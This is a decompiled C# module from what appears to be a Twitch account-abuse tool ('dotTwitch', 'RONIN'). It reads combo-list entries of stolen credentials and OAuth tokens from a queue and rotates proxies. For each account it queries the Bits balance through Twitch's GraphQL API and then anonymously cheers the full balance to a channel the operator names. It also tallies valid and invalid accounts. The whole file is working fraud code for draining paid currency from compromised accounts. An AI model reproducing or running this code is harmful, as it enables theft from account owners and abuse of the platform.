using System;
using System.Text.RegularExpressions;
using Leaf.xNet;
using RONIN.Core.BackEnd.SlavLib;
using RONIN.Core.BackEnd.Variables;

namespace dotTwitch.Core.Modules
{
	// Token: 0x02000012 RID: 18
	internal class Bits
	{
		// Token: 0x06000059 RID: 89 RVA: 0x00003724 File Offset: 0x00001924
		public static void Set()
		{
			Console.WriteLine("[What's the name of the channel you'd like to send bits to?]");
			Bits.channel = Console.ReadLine();
		}

		// Token: 0x0600005A RID: 90 RVA: 0x0000712C File Offset: 0x0000532C
		public static void DoWork()
		{
			for (;;)
			{
				SlavCore.UpdateTitle("Bits Sent", Bits.bTotal, null, 0);
				if (Var.comboQueue.Count != 0)
				{
					try
					{
						string text = Var.comboQueue.Take();
						for (;;)
						{
							try
							{
								if (text.Contains(":") || text.Contains(";") || text.Contains("|"))
								{
									string[] array = text.Split(new char[]
									{
										':',
										';',
										'|'
									});
									string text2 = array[0];
									string text3 = array[1];
									string text4 = array[2];
									if (text2.Contains("@"))
									{
										string text5 = text2.Split(new char[]
										{
											'@'
										})[0];
									}
									HttpRequest httpRequest = new HttpRequest();
									try
									{
										try
										{
											httpRequest.IgnoreProtocolErrors = true;
											httpRequest.KeepAlive = true;
											if (Var.proxies.Count != 0)
											{
												httpRequest.Proxy = SlavCore.LoadProxyType();
											}
											string value = Regex.Match(httpRequest.Get(string.Concat(new string[]
											{
												"https://api.twitch.tv/api/channels/",
												Bits.channel,
												"/access_token?need_https=true&oauth_token=",
												text4,
												"&platform=web&player_backend=mediaplayer&player_type=site"
											}), null).ToString(), "channel_id\\\\\":(.*?),\\\\\"chansub").Groups[1].Value;
											httpRequest.AddHeader("Authorization", "OAuth " + text4);
											string str = "[{\"operationName\":\"BitsCard_Bits\",\"variables\":{},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"fe1052e19ce99f10b5bd9ab63c5de15405ce87a1644527498f0fc1aadeff89f2\"}}},{\"operationName\":\"BitsCard_MainCard\",\"variables\":{\"name\":\"" + value + "\",\"withCheerBombEventEnabled\":false},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"88cb043070400a165104f9ce491f02f26c0b571a23b1abc03ef54025f6437848\"}}}]";
											string value2 = Regex.Match(httpRequest.Post("https://gql.twitch.tv/gql", str, "text/plain;charset=UTF-8").ToString(), "\"bitsBalance\":(.*?),").Groups[1].Value;
											Bits.bCnt = Convert.ToInt32(value2);
											if (Bits.bCnt > 0)
											{
												httpRequest.AddHeader("Client-ID", "kimne78kx3ncx6brgo4mv6wki5h1ko");
												httpRequest.AddHeader("Authorization", "OAuth " + text4);
												string str2 = string.Concat(new object[]
												{
													"[{\"operationName\":\"ChatInput_SendCheer\",\"variables\":{\"input\":{\"id\":\"",
													Guid.NewGuid(),
													"\",\"targetID\":\"",
													value,
													"\",\"bits\":",
													value2,
													",\"content\":\"Anon",
													value2,
													" \",\"isAutoModEnabled\":true,\"shouldCheerAnyway\":false,\"isAnonymous\":true}},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"57b0d6bd979e516ae3767f6586e7f23666d612d3a65af1d5436dba130c9426fd\"}}}]"
												});
												if (httpRequest.Post("https://gql.twitch.tv/gql", str2, "text/plain;charset=UTF-8").ToString().Contains("server error"))
												{
													Console.ForegroundColor = ConsoleColor.Red;
													Console.WriteLine("[X] " + text + " unable to send bits");
												}
												else
												{
													Console.ForegroundColor = ConsoleColor.Cyan;
													Console.WriteLine(string.Concat(new string[]
													{
														"[>] ",
														text,
														" sent ",
														value2,
														" to ",
														Bits.channel
													}));
													Bits.bTotal += Bits.bCnt;
												}
												SlavCore.Valid();
											}
											else
											{
												Console.WriteLine(text + " does not have any bits");
												SlavCore.Invalid();
											}
										}
										catch (HttpException)
										{
											SlavCore.Retry();
											continue;
										}
										catch (NullReferenceException)
										{
											SlavCore.Retry();
											continue;
										}
										catch (Exception ex)
										{
											Console.WriteLine(ex.ToString());
											SlavCore.Error();
											continue;
										}
										break;
									}
									finally
									{
										httpRequest.Dispose();
									}
								}
								SlavCore.Invalid();
							}
							catch (Exception ex2)
							{
								Console.WriteLine(ex2.ToString());
								SlavCore.Error();
								continue;
							}
							break;
						}
						continue;
					}
					catch (Exception ex3)
					{
						Console.WriteLine(ex3.ToString());
						continue;
					}
					break;
				}
				break;
			}
			Var.threads--;
		}

		// Token: 0x0400003C RID: 60
		public static int bCnt;

		// Token: 0x0400003D RID: 61
		public static int bTotal = 0;

		// Token: 0x0400003E RID: 62
		public static string channel = string.Empty;
	}
}
